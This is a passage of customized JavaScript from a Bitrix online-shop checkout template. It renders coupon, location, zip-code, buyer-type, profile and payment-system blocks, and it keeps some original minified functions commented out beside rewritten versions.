                                    newCoupon && newCoupon.value && (this.sendRequest("enterCoupon", newCoupon.value), newCoupon.value = "")
                                }), this)
                            }
                        })]
                    }), BX.create("SPAN", {props: {className: "bx-soa-coupon-item"}, children: couponsList})]
                });
            basketItemsNode.appendChild(BX.create("DIV", {
                props: {className: "bx-soa-coupon"},
                children: [couponsBlock]
            }))
        }, editCouponsFade: function (basketItemsNode) {
            if (!(this.result.COUPON_LIST.length < 1)) {
                var couponsList = this.getCouponsList(!1), couponsLabel, couponsBlock;
                couponsList.length && (couponsLabel = this.getCouponsLabel(!1), couponsBlock = BX.create("DIV", {
                    props: {className: "bx-soa-coupon-block"},
                    children: [BX.create("DIV", {
                        props: {className: "bx-soa-coupon-list"},
                        children: [BX.create("DIV", {
                            props: {className: "bx-soa-coupon-item"},
                            children: [couponsLabel].concat(couponsList)
                        })]
                    })]
                }), basketItemsNode.appendChild(BX.create("DIV", {
                    props: {className: "bx-soa-coupon bx-soa-coupon-item-fixed"},
                    children: [couponsBlock]
                })))
            }
        }, getCouponsList: function (active) {
            var couponsList = [], i;
            for (i = 0; i < this.result.COUPON_LIST.length; i++) (active || !active && "APPLIED" == this.result.COUPON_LIST[i].JS_STATUS) && couponsList.push(this.getCouponNode({
                text: this.result.COUPON_LIST[i].COUPON,
                desc: this.result.COUPON_LIST[i].JS_CHECK_CODE,
                status: this.result.COUPON_LIST[i].JS_STATUS
            }, active));
            return couponsList
        }, getCouponNode: function (coupon, active) {
            var couponName = BX.util.htmlspecialchars(coupon.text) || "",
                couponDesc = coupon.desc && coupon.desc.length ? coupon.desc.charAt(0).toUpperCase() + coupon.desc.slice(1) : BX.message("SOA_NOT_FOUND"),
                couponStatus, couponItem, tooltip;
            switch ((coupon.status || "BAD").toUpperCase()) {
                case"ENTERED":
                    couponItem = "used", tooltip = "warning";
                    break;
                case"BAD":
                    couponItem = tooltip = "danger";
                    break;
                default:
                    couponItem = tooltip = "success"
            }
            return BX.create("STRONG", {
                attrs: {
                    "data-coupon": couponName,
                    className: "bx-soa-coupon-item-" + couponItem
                },
                children: active ? [couponName || "", BX.create("SPAN", {
                    props: {className: "bx-soa-coupon-remove"},
                    events: {
                        click: BX.delegate((function (e) {
                            var target = e.target || e.srcElement, coupon = BX.findParent(target, {tagName: "STRONG"});
                            coupon && coupon.getAttribute("data-coupon") && this.sendRequest("removeCoupon", coupon.getAttribute("data-coupon"))
                        }), this)
                    }
                }), BX.create("SPAN", {
                    props: {className: "bx-soa-tooltip bx-soa-tooltip-coupon bx-soa-tooltip-" + tooltip + " tooltip top"},
                    children: [BX.create("SPAN", {props: {className: "tooltip-arrow"}}), BX.create("SPAN", {
                        props: {className: "tooltip-inner"},
                        text: couponDesc
                    })]
                })] : [couponName]
            })
        }, getCouponsLabel: function (active) {
            return BX.create("DIV", {
                props: {className: "bx-soa-coupon-label"},
                children: active ? [BX.create("LABEL", {html: this.params.MESS_USE_COUPON + ":"})] : [this.params.MESS_COUPON + ":"]
            })
        }, addCoupon: function (coupon) {
            for (var couponListNodes = this.orderBlockNode.querySelectorAll(".bx-soa-coupon:not(.bx-soa-coupon-item-fixed) .bx-soa-coupon-item"), i = 0; i < couponListNodes.length && !couponListNodes[i].querySelector('[data-coupon="' + BX.util.htmlspecialchars(coupon) + '"]'); i++) couponListNodes[i].appendChild(this.getCouponNode({text: coupon}, !0, "bx-soa-coupon-item-danger"))
        }, removeCoupon: function (coupon) {
            var couponNodes = this.orderBlockNode.querySelectorAll('[data-coupon="' + BX.util.htmlspecialchars(coupon) + '"]'),
                i;
            for (i in couponNodes) couponNodes.hasOwnProperty(i) && BX.remove(couponNodes[i])
        }, editRegionBlock: function (active) {
            this.regionBlockNode && this.regionHiddenBlockNode && this.result.PERSON_TYPE && (active ? (this.editActiveRegionBlock(!0), !this.regionBlockNotEmpty && this.editFadeRegionBlock()) : this.editFadeRegionBlock(), this.initialized.region = !0)
        }, editActiveRegionBlock: function (activeNodeMode) {
            var node = activeNodeMode ? this.regionBlockNode : this.regionHiddenBlockNode, regionContent, regionNode,
                regionNodeCol;
            this.initialized.region || ((regionContent = node.querySelector(".bx-soa-section-content")) ? BX.cleanNode(regionContent) : (regionContent = this.getNewContainer(), node.appendChild(regionContent)), this.getErrorContainer(regionContent), regionNode = BX.create("DIV", {props: {className: "bx_soa_location row"}}), regionNodeCol = BX.create("DIV", {props: {className: "col-xs-12"}}), this.getProfilesControl(regionNodeCol), this.result.SHOW_AUTH || (this.regionBlockNotEmpty ? (BX.addClass(this.regionBlockNode, "bx-active"), this.regionBlockNode.style.display = "") : (BX.removeClass(this.regionBlockNode, "bx-active"), this.regionBlockNode.style.display = "none", this.result.IS_AUTHORIZED && void 0 === this.result.LAST_ORDER_DATA.FAIL || this.initFirstSection())), regionNode.appendChild(regionNodeCol), regionContent.appendChild(regionNode), this.getBlockFooter(regionContent))
        }, editFadeRegionBlock: function () {
            var regionContent = this.regionBlockNode.querySelector(".bx-soa-section-content"), newContent;
            this.initialized.region || (this.editActiveRegionBlock(!1), BX.remove(BX.lastChild(this.regionBlockNode))), newContent = this.getNewContainer(!0), this.regionBlockNode.appendChild(newContent), this.editFadeRegionContent(newContent)
        }, editFadeRegionContent: function (node) {
            if (node && this.locationsInitialized) {
                var selectedPersonType = this.getSelectedPersonType(),
                    errorNode = this.regionHiddenBlockNode.querySelector(".alert.alert-danger"), props = [],
                    locationProperty, input, zipValue = "", zipProperty, fadeParamName, i, k, locationString,
                    validRegionErrors;
                errorNode && node.appendChild(errorNode.cloneNode(!0)), "true" == this.regionBlockNode.getAttribute("data-visited") && ((validRegionErrors = this.isValidRegionBlock()).length ? BX.addClass(this.regionBlockNode, "bx-step-error") : BX.removeClass(this.regionBlockNode, "bx-step-error"))
            }
        }, getSelectedPersonType: function () {
            var personTypeInput, currentPersonType, personTypeId, i, personTypeLength = this.result.PERSON_TYPE.length;
            if (personTypeInput = 1 == personTypeLength ? this.propsBlockNode.querySelector("input[type=hidden][name=PERSON_TYPE]") : 2 == personTypeLength ? this.propsBlockNode.querySelector("input[type=radio][name=PERSON_TYPE]:checked") : this.propsBlockNode.querySelector("select[name=PERSON_TYPE] > option:checked")) for (i in personTypeId = personTypeInput.value, this.result.PERSON_TYPE) if (this.result.PERSON_TYPE[i].ID == personTypeId) {
                currentPersonType = this.result.PERSON_TYPE[i];
                break
            }
            return currentPersonType
        }, getDeliveryLocationInput: function (node) {
            var currentProperty, locationId, altId, location, k, altProperty, labelHtml, currentLocation, insertedLoc,
                labelTextHtml, label, input, altNode;
            for (k in this.result.ORDER_PROP.properties) if (this.result.ORDER_PROP.properties.hasOwnProperty(k) && "Y" == (currentProperty = this.result.ORDER_PROP.properties[k]).IS_LOCATION) {
                locationId = currentProperty.ID, altId = parseInt(currentProperty.INPUT_FIELD_LOCATION);
                break
            }
            if ((location = this.locations[locationId]) && location[0] && location[0].output) for (k in this.regionBlockNotEmpty = !0, labelHtml = '<label class="bx-soa-custom-label" for="soa-property-' + parseInt(locationId) + '">' + ("Y" == currentProperty.REQUIRED ? '<span class="bx-authform-starrequired">*</span> ' : "") + BX.util.htmlspecialchars(currentProperty.NAME) + (currentProperty.DESCRIPTION.length ? " <small>(" + BX.util.htmlspecialchars(currentProperty.DESCRIPTION) + ")</small>" : "") + "</label>", currentLocation = location[0].output, insertedLoc = BX.create("DIV", {
                attrs: {"data-property-id-row": locationId},
                props: {className: "form-group bx-soa-location-input-container soa-property-container"},
                style: {visibility: "hidden"},
                html: currentLocation.HTML
            }), node.appendChild(insertedLoc), node.appendChild(BX.create("INPUT", {
                props: {
                    type: "hidden",
                    name: "RECENT_DELIVERY_VALUE",
                    value: location[0].lastValue
                }
            })), currentLocation.SCRIPT) currentLocation.SCRIPT.hasOwnProperty(k) && BX.evalGlobal(currentLocation.SCRIPT[k].JS);
            if (location && location[0] && location[0].showAlt && altId > 0) for (k in this.result.ORDER_PROP.properties) if (parseInt(this.result.ORDER_PROP.properties[k].ID) == altId) {
                altProperty = this.result.ORDER_PROP.properties[k];
                break
            }
            altProperty && (altNode = BX.create("DIV", {
                attrs: {"data-property-id-row": altProperty.ID},
                props: {className: "form-group bx-soa-location-input-container"}
            }), labelTextHtml = BX.util.htmlspecialchars(altProperty.NAME), labelTextHtml += "Y" == altProperty.REQUIRED ? '<span class="bx-authform-starrequired">*</span> ' : "", label = BX.create("LABEL", {
                attrs: {for: "altProperty"},
                props: {className: "bx-soa-custom-label"},
                html: labelTextHtml
            }), input = BX.create("INPUT", {
                props: {
                    id: "altProperty",
                    type: "text",
                    placeholder: altProperty.DESCRIPTION,
                    autocomplete: "city",
                    className: "form-control bx-soa-customer-input bx-ios-fix",
                    name: "ORDER_PROP_" + altProperty.ID,
                    value: altProperty.VALUE
                }
            }), altNode.appendChild(label), altNode.appendChild(input), node.appendChild(altNode), this.bindValidation(altProperty.ID, altNode)), location && location[0] && node.appendChild(BX.create("DIV", {
                props: {className: "bx-soa-reference"},
                html: this.params.MESS_REGION_REFERENCE
            }))
        }, getLocationString: function (node) {
            if (!node) return "";
            var locationInputNode = node.querySelector(".bx-ui-sls-route"), locationString = "", locationSteps, i,
                altLoc;
            if (locationInputNode && locationInputNode.value && locationInputNode.value.length) locationString = locationInputNode.value; else {
                for (i = (locationSteps = node.querySelectorAll(".bx-ui-combobox-fake.bx-combobox-fake-as-input")).length; i--;) locationSteps[i].innerHTML.indexOf("...") >= 0 || (locationSteps[i].innerHTML.indexOf("---") >= 0 ? (altLoc = BX("altProperty")) && altLoc.value.length && (locationString += altLoc.value) : (locationString.length && (locationString += ", "), locationString += locationSteps[i].innerHTML));
                0 == locationString.length && (locationString = BX.message("SOA_NOT_SPECIFIED"))
            }
            return locationString
        }, getZipLocationInput: function (node, deliveryItemsContainer) {
            // var zipProperty, i, propsItemNode, labelTextHtml, label, input;
            // if (!deliveryItemsContainer)
            //     deliveryItemsContainer = this.propsBlockNode.querySelector('.col-sm-12.bx-soa-delivery');
            // for (i in this.result.ORDER_PROP.properties) if (this.result.ORDER_PROP.properties.hasOwnProperty(i) && "Y" == this.result.ORDER_PROP.properties[i].IS_ZIP) {
            //     zipProperty = this.result.ORDER_PROP.properties[i];
            //     break
            // }
            // if (zipProperty) {
            //     this.regionBlockNotEmpty = !0, (propsItemNode = BX.create("DIV", {props: {className: "form-group bx-soa-location-input-container"}})).setAttribute("data-property-id-row", zipProperty.ID), labelTextHtml = BX.util.htmlspecialchars(zipProperty.NAME), labelTextHtml += "Y" == zipProperty.REQUIRED ? '<span class="bx-authform-starrequired">*</span> ' : "", label = BX.create("LABEL", {
            //         attrs: {for: "zipProperty"},
            //         props: {className: "bx-soa-custom-label"},
            //         html: labelTextHtml
            //     }), input = BX.create("INPUT", {
            //         props: {
            //             id: "zipProperty",
            //             type: "text",
            //             placeholder: zipProperty.DESCRIPTION,
            //             autocomplete: "zip",
            //             className: "form-control bx-soa-customer-input bx-ios-fix",
            //             name: "ORDER_PROP_" + zipProperty.ID,
            //             value: zipProperty.VALUE
            //         }
            //     }), propsItemNode.appendChild(label), propsItemNode.appendChild(input);
            //     const $zipInner = BX.create("DIV", {
            //         props: {className: "group-without-margin"},
            //         children: [propsItemNode, BX.create("input", {
            //             props: {
            //                 id: "ZIP_PROPERTY_CHANGED",
            //                 name: "ZIP_PROPERTY_CHANGED",
            //                 type: "hidden",
            //                 value: this.result.ZIP_PROPERTY_CHANGED || "N"
            //             }
            //         })]
            //     }), $zipWrapper = BX.create("DIV", {props: {className: "col-sm-4"}, children: [$zipInner]});
            //     deliveryItemsContainer.appendChild($zipWrapper), this.bindValidation(zipProperty.ID, propsItemNode)
            // }

            var zipProperty, i, propsItemNode, labelTextHtml, label, input;

            for (i in this.result.ORDER_PROP.properties)
            {
                if (this.result.ORDER_PROP.properties.hasOwnProperty(i) && this.result.ORDER_PROP.properties[i].IS_ZIP == 'Y')
                {
                    zipProperty = this.result.ORDER_PROP.properties[i];
                    break;
                }
            }


            if (zipProperty)
            {
                this.regionBlockNotEmpty = true;

                propsItemNode = BX.create('DIV', {props: {className: "form-group bx-soa-location-input-container"}});
                propsItemNode.setAttribute('data-property-id-row', zipProperty.ID);

                labelTextHtml = zipProperty.REQUIRED == 'Y' ? '<span class="bx-authform-starrequired">*</span> ' : '';
                labelTextHtml += BX.util.htmlspecialchars(zipProperty.NAME);

                label = BX.create('LABEL', {
                    attrs: {'for': 'zipProperty'},
                    props: {className: 'bx-soa-custom-label'},
                    html: labelTextHtml
                });
                input = BX.create('INPUT', {
                    props: {
                        id: 'zipProperty',
                        type: 'text',
                        placeholder: zipProperty.DESCRIPTION,
                        autocomplete: 'zip',
                        className: 'form-control bx-soa-customer-input bx-ios-fix',
                        name: 'ORDER_PROP_' + zipProperty.ID,
                        value: zipProperty.VALUE
                    }
                });

                propsItemNode.appendChild(label);
                propsItemNode.appendChild(input);

                // var adresNode = BX('bx-soa-delivery').querySelector('.bx-soa-section-content');
                // // adresNode.appendChild(propsItemNode);
                // console.log(this.result.ORDER_PROP.properties);
                var group, property, groupIterator = this.propertyCollection.getGroupIterator(), propsIterator;
                while (group = groupIterator())
                {
                    propsIterator =  group.getIterator();
                    while (property = propsIterator())
                    {
                        if(property.getId() == '53'){
                            this.deliveryPropsArray.push(property);
                        }
                    }
                }

                node.appendChild(propsItemNode);
                node.appendChild(
                    BX.create('input', {
                        props: {
                            id: 'ZIP_PROPERTY_CHANGED',
                            name: 'ZIP_PROPERTY_CHANGED',
                            type: 'hidden',
                            value: this.result.ZIP_PROPERTY_CHANGED || 'N'
                        }
                    })
                );

                this.bindValidation(zipProperty.ID, propsItemNode);
            }

        }, getPersonTypeSortedArray: function (objPersonType) {
            var personTypes = [], k;
            for (k in objPersonType) objPersonType.hasOwnProperty(k) && personTypes.push(objPersonType[k]);
            return personTypes.sort((function (a, b) {
                return parseInt(a.SORT) - parseInt(b.SORT)
            }))
        }, getPersonTypeControl: function (node) {
            if (this.result.PERSON_TYPE) {
                this.result.PERSON_TYPE = this.getPersonTypeSortedArray(this.result.PERSON_TYPE);
                var personTypesCount = this.result.PERSON_TYPE.length, currentType, oldPersonTypeId, i, input,
                    options = [], label, delimiter = !1;
                if (personTypesCount > 2) {
                    for (i in this.result.PERSON_TYPE) this.result.PERSON_TYPE.hasOwnProperty(i) && (currentType = this.result.PERSON_TYPE[i], options.push(BX.create("OPTION", {
                        props: {
                            value: currentType.ID,
                            selected: "Y" == currentType.CHECKED
                        }, text: currentType.NAME
                    })), "Y" == currentType.CHECKED && (oldPersonTypeId = currentType.ID));
                    node.appendChild(BX.create("SELECT", {
                        props: {name: "PERSON_TYPE", className: "form-control"},
                        children: options,
                        events: {change: BX.proxy(this.sendRequest, this)}
                    })), this.regionBlockNotEmpty = !0
                } else if (2 == personTypesCount) {
                    for (i in this.result.PERSON_TYPE) this.result.PERSON_TYPE.hasOwnProperty(i) && (currentType = this.result.PERSON_TYPE[i], label = BX.create("LABEL", {
                        children: [BX.create("INPUT", {
                            attrs: {checked: "Y" == currentType.CHECKED},
                            props: {type: "radio", name: "PERSON_TYPE", value: currentType.ID}
                        }), BX.util.htmlspecialchars(currentType.NAME)],
                        events: {change: BX.proxy(this.sendRequest, this)}
                    }), node.appendChild(BX.create("DIV", {
                        props: {className: "person-type" + ("Y" == currentType.CHECKED ? " active" : "")},
                        children: [label]
                    })), "Y" == currentType.CHECKED && (oldPersonTypeId = currentType.ID));
                    this.regionBlockNotEmpty = !0
                } else for (i in this.result.PERSON_TYPE) this.result.PERSON_TYPE.hasOwnProperty(i) && node.appendChild(BX.create("INPUT", {
                    props: {
                        type: "hidden",
                        name: "PERSON_TYPE",
                        value: this.result.PERSON_TYPE[i].ID
                    }
                }));
                oldPersonTypeId && node.appendChild(BX.create("INPUT", {
                    props: {
                        type: "hidden",
                        name: "PERSON_TYPE_OLD",
                        value: oldPersonTypeId
                    }
                }))
            }
        }, getProfilesControl: function (node) {
            var profilesLength = BX.util.object_keys(this.result.USER_PROFILES).length, i, label, options = [],
                profileChangeInput, input;
            if (profilesLength) if ("Y" === this.params.ALLOW_USER_PROFILES && (profilesLength > 1 || "Y" === this.params.ALLOW_NEW_PROFILE)) {
                for (i in this.regionBlockNotEmpty = !0, label = BX.create("LABEL", {
                    props: {className: "bx-soa-custom-label"},
                    html: this.params.MESS_SELECT_PROFILE
                }), this.result.USER_PROFILES) this.result.USER_PROFILES.hasOwnProperty(i) && options.unshift(BX.create("OPTION", {
                    props: {
                        value: this.result.USER_PROFILES[i].ID,
                        selected: "Y" === this.result.USER_PROFILES[i].CHECKED
                    }, html: this.result.USER_PROFILES[i].NAME
                }));
                "Y" === this.params.ALLOW_NEW_PROFILE && options.unshift(BX.create("OPTION", {
                    props: {value: 0},
                    text: BX.message("SOA_PROP_NEW_PROFILE")
                })), profileChangeInput = BX.create("INPUT", {
                    props: {
                        type: "hidden",
                        value: "N",
                        id: "profile_change",
                        name: "profile_change"
                    }
                }), input = BX.create("SELECT", {
                    props: {className: "form-control", name: "PROFILE_ID"},
                    children: options,
                    events: {
                        change: BX.delegate((function () {
                            BX("profile_change").value = "Y", this.sendRequest()
                        }), this)
                    }
                }), node.appendChild(BX.create("DIV", {
                    props: {className: "form-group bx-soa-location-input-container"},
                    children: [label, profileChangeInput, input]
                }))
            } else for (i in this.result.USER_PROFILES) this.result.USER_PROFILES.hasOwnProperty(i) && "Y" === this.result.USER_PROFILES[i].CHECKED && node.appendChild(BX.create("INPUT", {
                props: {
                    name: "PROFILE_ID",
                    type: "hidden",
                    value: this.result.USER_PROFILES[i].ID
                }
            }))
        }, editPaySystemBlock: function (active) {
            this.paySystemBlockNode && this.paySystemHiddenBlockNode && this.result.PAY_SYSTEM && (this.editActivePaySystemBlock(active), this.initialized.paySystem = !0)
        }, editActivePaySystemBlock: function (activeNodeMode) {
            var node = activeNodeMode ? this.paySystemBlockNode : this.paySystemHiddenBlockNode, paySystemContent,
                paySystemNode;
            1 === this.result.PAY_SYSTEM.length ? this.paySystemBlockNode.classList.add("hidden") : this.paySystemBlockNode.classList.remove("hidden"), this.initialized.paySystem || (this.opened["bx-soa-paysystem"] || this.paySystemBlockNode.classList.add("bx-step-completed"), (paySystemContent = node.querySelector(".bx-soa-section-content")) ? BX.cleanNode(paySystemContent) : (paySystemContent = this.getNewContainer(), node.appendChild(paySystemContent)), this.getErrorContainer(paySystemContent), paySystemNode = BX.create("DIV", {props: {className: "bx-soa-pp row"}}), this.editPaySystemItems(paySystemNode), paySystemContent.appendChild(paySystemNode), this.editPaySystemInfo(paySystemNode), this.getBlockFooter(paySystemContent)), activeNodeMode && this.initialized.paySystem || this.getPaySystemCompactInfo()
        }, getPaySystemCompactInfo: function () {
            BX.remove(BX.lastChild(this.paySystemBlockNode.querySelector(".bx-compact-wrapper")));
            let currentPaySystem = this.getSelectedPaySystem();
            if (currentPaySystem) {
                const childrenBlocks = [], $paymentLabel = BX.create("div", {
                    props: {className: "bx-compact-title"},
                    html: currentPaySystem.NAME
                });
                childrenBlocks.push($paymentLabel);
                const $wrapper = BX.create("div", {props: {className: "bx-compact-inner"}, children: childrenBlocks});
                this.paySystemBlockNode.querySelector(".bx-compact-wrapper").appendChild($wrapper)
            }
        }, editFadePaySystemBlock: function () {
            var paySystemContent = this.paySystemBlockNode.querySelector(".bx-soa-section-content"), newContent;
            this.initialized.paySystem ? this.opened["bx-soa-paysystem"] = !1 : (this.editActivePaySystemBlock(!1), BX.remove(BX.lastChild(this.paySystemBlockNode)))
        }, editPaySystemItems: function (paySystemNode) {
            if (this.result.PAY_SYSTEM && !(this.result.PAY_SYSTEM.length <= 0)) {
                var paySystemItemsContainer = BX.create("DIV", {props: {className: "col-sm-12 bx-soa-pp-item-container"}}),
                    paySystemItemNode, i,
                    paySystemItemsDescription = BX.create("DIV", {props: {className: "col-sm-12 bx-soa-pp-company-description"}});
                for (i = 0; i < this.paySystemPagination.currentPage.length; i++) paySystemItemNode = this.createPaySystemItem(this.paySystemPagination.currentPage[i]), paySystemItemsContainer.appendChild(paySystemItemNode), "Y" == this.paySystemPagination.currentPage[i].CHECKED && (paySystemItemsDescription.innerHTML = this.paySystemPagination.currentPage[i].DESCRIPTION);
                this.paySystemPagination.show && this.showPagination("paySystem", paySystemItemsContainer), paySystemNode.appendChild(paySystemItemsContainer)
            }
        }, createPaySystemItem: function (item) {
            var checked = "Y" == item.CHECKED, paySystemId = parseInt(item.ID), labelNodes, itemInnerNode, title, label,
                itemNode, injectNode;
            return labelNodes = [BX.create("INPUT", {
                props: {
                    id: "ID_PAY_SYSTEM_ID_" + paySystemId,
                    name: "PAY_SYSTEM_ID",
                    type: "radio",
                    className: "bx-soa-pp-company-checkbox",
                    value: paySystemId,
                    checked: checked
                }
            }), BX.create("LABEL", {
                props: {
                    for: "ID_PAY_SYSTEM_ID_" + paySystemId,
                    className: "bx-soa-pp-company-label properties__title char_name",
                    lang: "ru"
                },
                html: "<span>" + ("N" != this.params.SHOW_PAY_SYSTEM_LIST_NAMES ? item.NAME : item.OWN_NAME) + "</span>" + (this.uniqueText(item.DESCRIPTION) ? "<div class='hint colored_theme_hover_bg-block'><span class='icon colored_theme_hover_bg-el'><i>?</i></span><div class='tooltip'>" + item.DESCRIPTION + "</div></div>" : ""),
                events: {click: BX.proxy(this.selectPaySystem, this)}
            })], label = BX.create("DIV", {
                props: {className: "bx-soa-pp-company-graf-container properties"},
                children: labelNodes
            }), injectNode = BX.create("DIV", {
                props: {className: "bx-soa-pp-company-inject clearfix hidden"},
                html: ""
            }), itemInnerNode = BX.create("DIV", {
                props: {className: "bx-soa-pp-company-inner filter radio bordered rounded3"},
                children: [label, injectNode]
            }), (itemNode = BX.create("DIV", {
                props: {className: "bx-soa-pp-company bx-soa-pp-company-item col-lg-4 col-sm-6 col-xs-12"},
                children: [itemInnerNode]
            })).setAttribute("data-id", item.ID), checked && BX.addClass(itemNode, "bx-selected"), itemNode
        }, editPaySystemInfo: function (paySystemNode) {
            // if (this.result.PAY_SYSTEM && (0 != this.result.PAY_SYSTEM.length || "Y" == this.result.PAY_FROM_ACCOUNT)) {
            //     var paySystemInfoContainer = BX.create("DIV", {props: {className: "bx-soa-pp-desc-container"}}),
            //         innerPs, extPs, delimiter, currentPaySystem, logotype, logoNode, subTitle, label, title, price;
            //     BX.cleanNode(paySystemInfoContainer), "Y" == this.result.PAY_FROM_ACCOUNT && (innerPs = this.getInnerPaySystem(paySystemInfoContainer)), currentPaySystem = this.getSelectedPaySystem(), paySystemInfoContainer.appendChild(BX.create("DIV", {
            //         props: {className: "bx-soa-pp-company"},
            //         children: [innerPs, delimiter, extPs]
            //     }));
            //     var injectNodes = BX.findChildren(this.paySystemBlockNode, {className: "bx-soa-pp-company-inject"}, !0),
            //         paySystemNode;
            //     if (injectNodes && injectNodes.length) for (var i = 0; i < injectNodes.length; ++i) BX.addClass(injectNodes[i], "hidden"), BX.cleanNode(injectNodes[i]);
            //     if (currentPaySystem) if ((paySystemNode = BX.findChildren(this.paySystemBlockNode, {
            //         className: "bx-soa-pp-company",
            //         attribute: {"data-id": currentPaySystem.ID}
            //     }, !0)) && paySystemNode.length) {
            //         var injectNode = BX.findChildren(paySystemNode[0], {className: "bx-soa-pp-company-inject"}, !0);
            //         injectNode && injectNode.length && (BX.cleanNode(injectNode[0]), injectNode[0].appendChild(paySystemInfoContainer), BX.removeClass(injectNode[0], "hidden"))
            //     }
            // }

            if (!this.result.PAY_SYSTEM || (this.result.PAY_SYSTEM.length == 0 && this.result.PAY_FROM_ACCOUNT != 'Y'))
                return;

            var paySystemInfoContainer = BX.create('DIV', {
                    props: {
                        className: (this.result.PAY_SYSTEM.length == 0 ? 'col-sm-12' : 'col-sm-5') + ' bx-soa-pp-desc-container'
                    }
                }),
                innerPs, extPs, delimiter, currentPaySystem,
                logotype, logoNode, subTitle, label, title, price;

            BX.cleanNode(paySystemInfoContainer);

            if (this.result.PAY_FROM_ACCOUNT == 'Y')
                innerPs = this.getInnerPaySystem(paySystemInfoContainer);

            currentPaySystem = this.getSelectedPaySystem();
            if (currentPaySystem)
            {
                logoNode = BX.create('DIV', {props: {className: 'bx-soa-pp-company-image'}});
                logotype = this.getImageSources(currentPaySystem, 'PSA_LOGOTIP');
                if (logotype && logotype.src_2x)
                {
                    logoNode.setAttribute('style',
                        'background-image: url("' + logotype.src_1x + '");' +
                        'background-image: -webkit-image-set(url("' + logotype.src_1x + '") 1x, url("' + logotype.src_2x + '") 2x)'
                    );
                }
                else
                {
                    logotype = logotype && logotype.src_1x || this.defaultPaySystemLogo;
                    logoNode.setAttribute('style', 'background-image: url("' + logotype + '");');
                }

                if (this.params.SHOW_PAY_SYSTEM_INFO_NAME == 'Y')
                {
                    subTitle = BX.create('DIV', {
                        props: {className: 'bx-soa-pp-company-subTitle'},
                        text: currentPaySystem.NAME
                    });
                }

                label = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-logo'},
                    children: [
                        BX.create('DIV', {
                            props: {className: 'bx-soa-pp-company-graf-container'},
                            children: [logoNode]
                        })
                    ]
                });

                title = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-block'},
                    children: [BX.create('DIV', {props: {className: 'bx-soa-pp-company-desc'}, html: currentPaySystem.DESCRIPTION})]
                });

                if (currentPaySystem.PRICE && parseFloat(currentPaySystem.PRICE) > 0)
                {
                    price = BX.create('UL', {
                        props: {className: 'bx-soa-pp-list'},
                        children: [
                            BX.create('LI', {
                                children: [
                                    BX.create('DIV', {props: {className: 'bx-soa-pp-list-termin'}, html: this.params.MESS_PRICE + ':'}),
                                    BX.create('DIV', {props: {className: 'bx-soa-pp-list-description'}, text: '~' + currentPaySystem.PRICE_FORMATTED})
                                ]
                            })
                        ]
                    });
                }

                extPs = BX.create('DIV', {children: [subTitle, label, title, price]});
            }

            if (innerPs && extPs)
                delimiter = BX.create('HR', {props: {className: 'bxe-light'}});

            paySystemInfoContainer.appendChild(
                BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company'},
                    children: [innerPs, delimiter, extPs]
                })
            );
            paySystemNode.appendChild(paySystemInfoContainer);

        }, getInnerPaySystem: function () {
            // if (this.result.CURRENT_BUDGET_FORMATED && this.result.PAY_CURRENT_ACCOUNT && this.result.INNER_PAY_SYSTEM) {
            //     var accountOnly = this.params.ONLY_FULL_PAY_FROM_ACCOUNT && "Y" == this.params.ONLY_FULL_PAY_FROM_ACCOUNT,
            //         isSelected = this.result.PAY_CURRENT_ACCOUNT && "Y" == this.result.PAY_CURRENT_ACCOUNT,
            //         paySystem = this.result.INNER_PAY_SYSTEM, logotype, logoNode, subTitle, label, title, hiddenInput,
            //         htmlString, innerPsDesc, balanceString;
            //     return label = BX.create("LABEL", {
            //         props: {
            //             className: "bx-soa-pp-company-subTitle" + (isSelected ? " checked" : ""),
            //             htmlFor: "PAY_CURRENT_ACCOUNT"
            //         }, text: paySystem.NAME
            //     }), hiddenInput = BX.create("INPUT", {
            //         props: {
            //             type: "checkbox",
            //             className: "bx-soa-pp-company-checkbox",
            //             name: "PAY_CURRENT_ACCOUNT",
            //             id: "PAY_CURRENT_ACCOUNT",
            //             value: "Y",
            //             checked: isSelected
            //         }
            //     }), balanceString = BX.util.htmlspecialchars(this.params.MESS_INNER_PS_BALANCE + " " + this.result.CURRENT_BUDGET_FORMATED), balanceString = this.params.MESS_INNER_PS_BALANCE + " " + this.result.CURRENT_BUDGET_FORMATED, label.setAttribute("title", balanceString), subTitle = BX.create("DIV", {
            //         props: {className: "filter label_block" + (isSelected ? " checked" : "")},
            //         children: [hiddenInput, label]
            //     }), BX.create("DIV", {
            //         props: {className: "bx-soa-pp-inner-ps" + (isSelected ? " bx-selected" : "")},
            //         children: [subTitle],
            //         events: {click: BX.proxy(this.selectPaySystem, this)}
            //     })
            // }
            if (!this.result.CURRENT_BUDGET_FORMATED || !this.result.PAY_CURRENT_ACCOUNT || !this.result.INNER_PAY_SYSTEM)
                return;

            var accountOnly = this.params.ONLY_FULL_PAY_FROM_ACCOUNT && (this.params.ONLY_FULL_PAY_FROM_ACCOUNT == 'Y'),
                isSelected = this.result.PAY_CURRENT_ACCOUNT && (this.result.PAY_CURRENT_ACCOUNT == 'Y'),
                paySystem = this.result.INNER_PAY_SYSTEM,
                logotype, logoNode,subTitle, label, title, hiddenInput, htmlString, innerPsDesc;

            if (this.params.SHOW_PAY_SYSTEM_INFO_NAME == 'Y')
            {
                subTitle = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-subTitle'},
                    text: paySystem.NAME
                });
            }

            logoNode = BX.create('DIV', {props: {className: 'bx-soa-pp-company-image'}});
            logotype = this.getImageSources(paySystem, 'LOGOTIP');
            if (logotype && logotype.src_2x)
            {
                logoNode.setAttribute('style',
                    'background-image: url("' + logotype.src_1x + '");' +
                    'background-image: -webkit-image-set(url("' + logotype.src_1x + '") 1x, url("' + logotype.src_2x + '") 2x)'
                );
            }
            else
            {
                logotype = logotype && logotype.src_1x || this.defaultPaySystemLogo;
                logoNode.setAttribute('style', 'background-image: url("' + logotype + '");');
            }

            label = BX.create('DIV', {
                props: {className: 'bx-soa-pp-company-logo'},
                children: [
                    BX.create('DIV', {
                        props: {className: 'bx-soa-pp-company-graf-container'},
                        children: [
                            BX.create('INPUT', {
                                props: {
                                    type: 'checkbox',
                                    className: 'bx-soa-pp-company-checkbox',
                                    name: 'PAY_CURRENT_ACCOUNT',
                                    value: 'Y',
                                    checked: isSelected
                                }
                            }),
                            logoNode
                        ],
                        events: {
                            click: BX.proxy(this.selectPaySystem, this)
                        }
                    })
                ]
            });

            if (paySystem.DESCRIPTION && paySystem.DESCRIPTION.length)
            {
                title = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-block'},
